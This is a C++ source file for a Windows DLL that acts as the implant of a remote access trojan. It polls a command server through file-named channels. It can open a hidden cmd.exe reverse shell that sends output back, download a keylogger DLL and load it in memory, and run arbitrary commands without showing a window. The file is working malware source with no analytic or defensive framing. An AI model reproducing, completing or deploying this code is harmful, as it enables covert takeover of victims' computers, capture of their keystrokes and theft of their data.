//cl /EHsc /LD .\target_code.cpp
#define WIN32_LEAN_AND_MEAN
#define DEBUG 0
#include <iostream>
#include <Windows.h>
#include <string>
#include <thread>
#include <fstream>
#include <vector>

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

HANDLE hChildStdOutRead, hChildStdOutWrite;                                     // stdout
HANDLE hChildStdInRead, hChildStdInWrite;                                       // stdin
bool connected = false;
bool outerloop = true; bool loop = true;


typedef struct INIT_PARAMS
{
    void* base_address;

    void* (*FindExportAddress)(HMODULE, const char*);
    void* (*MemoryLoadLibrary)(const void *, size_t);
    void (*MemoryFreeLibrary)(void*);
    void* (*MemoryGetBaseAddress)(void*);
}INIT_PARAMS;
INIT_PARAMS sKey_l;
INIT_PARAMS* pStruct = nullptr;

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool ExecuteCommand(const std::string& command);
void give_command(const std::string &command);
bool rev_shell();
int main_thing();
int klggr();

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////

typedef int (*SendDataFunc)(const std::string&, const std::string&);
typedef std::string (*RecvDataFunc)(const std::string&);
typedef std::vector<unsigned char> (*RecvDataRawFunc)(const std::string&);
SendDataFunc send_data;
RecvDataFunc receive_data;
RecvDataRawFunc receive_data_raw;

typedef int (*target_init_KL)(INIT_PARAMS* params);
target_init_KL Target_initialization_KL = nullptr;

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

__declspec(dllexport) int target_init(INIT_PARAMS* params)
{
    pStruct = params;

    receive_data_raw = (RecvDataRawFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(pStruct->base_address), "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
    receive_data = (RecvDataFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(pStruct->base_address), "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
    send_data = (SendDataFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(pStruct->base_address), "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");

    if (!receive_data || !send_data || !receive_data_raw)
    {
        std::cerr << "Failed to get one or more function addresses.\n";
        return 0;
    }

    main_thing();
    return 1;
}

int main_thing()  
{
    while(outerloop)
    {
        Sleep(1000);

        // std::ifstream file("target_data.rat");
        // std::string lines[3];

        // for (int i = 0; i < 3 && std::getline(file, lines[i]); ++i);
        // send_data("con_targets.txt", lines[1] + " ( " + lines[2] +" )");

        //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        while(loop)
        {
            if(receive_data("from_server.txt")[0] == '`')
            {
                Sleep(1000);
                std::cout<< "waiting for data " << std::endl;
            }
            else
            {
                char option = receive_data("from_server.txt")[0];
                std::cout << "option: " << option << std::endl;
                switch (option)
                {
                    case '3':                                                                                     //rev shell
                    {
                        send_data("from_server.txt","`");                                                    //mark the file read(switch)
                        
                        if(!rev_shell())
                        {
                            std::cerr << "Failed to establish reverse shell." << std::endl;
                            loop = false;
                            outerloop = false;
                        }
                        break;
                    }
                    case '4':                                                                                     //keylogger
                    {
                        if(receive_data("from_server.txt")[0] == '`')
                        {
                            Sleep(100);
                            std::cout<< "waiting for payload " << std::endl;
                        }      
                        else
                        {
                            std::string payload_keylogger = (receive_data("from_server.txt").substr(1));
                            std::cout << "Recieved after waiting ->" << payload_keylogger << std::endl;
                            // ExecuteCommand(payload_keylogger);

                            klggr();

                        }
                        
                        send_data("from_server.txt","`");
                        //std::cout << "mark the received command as read [switch3]" << endl;
                        break;
                    }

                    case '~':                                                                                    //dc from server
                    {
                        send_data("from_server.txt","`");                                                    //mark the file read(switch)
                        //std::cout << "mark the file read [switch] inside case ~" << endl;
                        
                        //std::cout << "Server initiated disconnect.\n";
                        loop = false;
                        connected = false;
                        
                        break;
                    }
                    case '#':                                                                                    //end all
                    {
                        if(receive_data("from_server.txt")[0] == '`')
                        {
                            Sleep(100);
                            std::cout<< "waiting for payload " << std::endl;
                        }      
                        else
                        {
                            std::string payload_end = (receive_data("from_server.txt").substr(1));
                            std::cout << "Recieved after waiting ->" << payload_end << std::endl;
                            //ExecuteCommand(payload_end);
                        }
                        
                        send_data("from_server.txt","`");
                        //std::cout << "mark the received command as read [del]" << endl;
                        loop = false;
                        outerloop = false;
                        
                        break;
                    }
                    default:
                    {
                        send_data("from_server.txt","`");                                                //mark the file read(switch)              
                        break;
                    }
                }
            }
        }
    }

    return 0;
}

bool ExecuteCommand(const std::string& command)
{
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Convert std::string to std::wstring
    int wlen = MultiByteToWideChar(CP_UTF8, 0, command.c_str(), -1, NULL, 0);
    std::wstring wcommand(wlen, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, command.c_str(), -1, &wcommand[0], wlen);

    std::wstring cmdLine = L"cmd.exe /c " + wcommand;

    if(!CreateProcessW(NULL,const_cast<wchar_t*>(cmdLine.c_str()),NULL,NULL,FALSE,CREATE_NO_WINDOW, NULL,NULL,&si,&pi))
    {
        std::cerr << "CreateProcess failed with error code: " << GetLastError() << std::endl;
        return false;
    }             

    // Close process and thread handles. 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return true;
}

void give_command(const std::string &command)
{
    std::string cmd = command + "\r\n";
    // Write a command to the child process.
    DWORD bytesWritten;
    if (!WriteFile(hChildStdInWrite, cmd.c_str(), cmd.length(), &bytesWritten, NULL)) std::cerr << "WriteFile failed with error code: " << GetLastError() << std::endl;
    FlushFileBuffers(hChildStdInWrite); // Ensure the command is sent.
}

int klggr()
{

    if(!Target_initialization_KL)
    {
        #if DEBUG
        MessageBoxA(NULL,"In if", "In if", MB_ICONHAND);
        #endif

        void* vpKey_lib = nullptr;
        std::vector<unsigned char> vKey_lib;
        vKey_lib = receive_data_raw("keylogger.dll");

        vpKey_lib = pStruct->MemoryLoadLibrary(vKey_lib.data(), vKey_lib.size());
        if(vpKey_lib == nullptr)
        {
            #if DEBUG
            std::cerr << "Failed to load DLL from memory.\n";
            #endif

            return 0;
        }

        #if DEBUG
        MessageBoxA(NULL,"Downloaded n loaded", "Downloaded n loaded", MB_ICONHAND);
        #endif

        std::this_thread::sleep_for(std::chrono::milliseconds(100));
        void* BaseAddressKl = pStruct->MemoryGetBaseAddress(vpKey_lib);

        #if DEBUG
        char buffer[64];
        sprintf(buffer, "BaseAddressKl: 0x%p", BaseAddressKl);
        MessageBoxA(NULL, buffer, "Debug Info", MB_ICONINFORMATION);
        #endif

        Target_initialization_KL = (target_init_KL)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(BaseAddressKl),"?target_init_KL@@YAHPEAUINIT_PARAMS@@@Z");
        if (!Target_initialization_KL)
        {
            #if DEBUG
            std::cerr << "Failed to get Target_initialization_KL() address "<< GetLastError() << std::endl;
            #endif

            #if DEBUG
            MessageBoxA(NULL,"HUH?", "HUH?", MB_ICONHAND);
            #endif

            pStruct->MemoryFreeLibrary(vpKey_lib);
            return 0;
        }

        #if DEBUG
        MessageBoxA(NULL,"Got Entry point", "Got Entry point", MB_ICONHAND);
        #endif

    }

    #if DEBUG
    std::cout << "Calling Keyloggr" << std::endl; MessageBoxA(NULL,"Calling Keyloggr", "Calling Keyloggr", MB_ICONHAND);
    #endif

    std::thread([]() { Target_initialization_KL(pStruct); }).detach();
    
    return 1;
}

bool rev_shell()
{

    SECURITY_ATTRIBUTES saAttr = {0};
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;

    // Create pipes for child process's STDOUT.
    if (!CreatePipe(&hChildStdOutRead, &hChildStdOutWrite, &saAttr, 0) || !SetHandleInformation(hChildStdOutRead, HANDLE_FLAG_INHERIT, 0))
    {
        std::cerr << "Failed to create or set up stdout pipe." << std::endl;
        return 0;
    }

    // Create pipes for child process's STDIN.
    if (!CreatePipe(&hChildStdInRead, &hChildStdInWrite, &saAttr, 0) || !SetHandleInformation(hChildStdInWrite, HANDLE_FLAG_INHERIT, 0))
    {
        std::cerr << "Failed to create or set up stdin pipe." << std::endl;
        return 0;
    }

    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hChildStdOutWrite;
    si.hStdError = hChildStdOutWrite;
    si.hStdInput = hChildStdInRead;

    PROCESS_INFORMATION pi = {0};
    wchar_t command[] = L"cmd.exe";
    if (!CreateProcessW(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
    {
        std::cerr << "CreateProcess failed with error code: " << GetLastError() << std::endl;
        return 0;
    }

    // Close handles not needed by the parent.
    CloseHandle(hChildStdOutWrite);
    CloseHandle(hChildStdInRead);

    std::atomic<bool> processFinished(false);
    
    // Lambda for reading from the child process stdout
    auto readThread = std::thread([&]()
    {
        const size_t bufferSize = 4096;
        char buffer[bufferSize];
        DWORD bytesRead;

        while (!processFinished.load())
        {            
            if (ReadFile(hChildStdOutRead, buffer, bufferSize, &bytesRead, NULL))
            {
                if (bytesRead > 0) 
                {
                    buffer[bytesRead] = '\0';
                    std::cout << buffer;
                    send_data("from_client.txt" ,buffer);
                }
            } 
            else if (GetLastError() == ERROR_BROKEN_PIPE)
            {
                std::cerr << "Broken pipe." << std::endl;
                loop = false; outerloop = false;
                processFinished.store(true);
            }

            Sleep(500);
        }
    });

    // Lambda to handle writing to child process's stdin
    auto writeThread = std::thread([&]()
    {
        std::string cmd;
        while (!processFinished.load())  // Check if process is finished
        {
            Sleep(500);

            if(receive_data("from_server.txt")[0] == '`') continue;
            
            cmd = receive_data("from_server.txt");
            send_data("from_server.txt","`");
            if (cmd == "exit")
            {
                if(!send_data("from_client.txt","`"))
                {
                    std::cerr << "[Failed to send data to server]" << std::endl;
                    loop = false; outerloop = false;
                    processFinished.store(true);
                }
                processFinished.store(true); // Signal to stop reading thread
                break;
            }

            // Send the command to the child process's stdin
            give_command(cmd);
        }
    });

    // Wait for process threads to finish
    writeThread.join();
    processFinished.store(true);

    // Close stdin and terminate child process
    std::string exitCmd = "exit\r\n";
    DWORD bytesWritten;
    WriteFile(hChildStdInWrite, exitCmd.c_str(), exitCmd.length(), &bytesWritten, NULL);
    FlushFileBuffers(hChildStdInWrite);

    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up
    readThread.join();
    CloseHandle(hChildStdOutRead);
    CloseHandle(hChildStdInWrite);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);    

    return 1;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        //MessageBoxA(NULL, "DLL Attached", "Notification", MB_OK);
        //main_thing();
        break;
    case DLL_THREAD_ATTACH:
        //MessageBoxA(NULL, "Thread Attached", "Notification", MB_OK);
        //main_thing();
        break;
    case DLL_THREAD_DETACH:
        //MessageBoxA(NULL, "Thread Detached", "Notification", MB_OK);
        break;
    case DLL_PROCESS_DETACH:
        //MessageBoxA(NULL, "DLL Detached", "Notification", MB_OK);
        break;
    }
    return TRUE;
}